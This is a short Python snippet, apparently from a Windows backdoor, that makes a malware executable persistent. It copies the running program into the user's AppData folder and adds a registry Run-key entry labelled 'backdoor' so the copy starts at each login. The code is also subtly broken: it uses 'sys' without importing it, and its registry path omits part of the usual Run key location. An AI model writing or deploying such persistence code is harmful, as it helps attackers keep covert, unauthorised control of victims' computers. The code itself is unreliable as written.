#! python3
import os, subprocess, shutil
def persistencia():
	location = os.environ['appdata'] + '\\program.exe'
	if not os.path.exists(location):
		shutil.copyfile(sys.executable, location)
		subprocess.call('reg add HKCU\Software\Microsoft\CurrentVersion\run /v backdoor /t REG_SZ /d"' + location + '"', shell=True)
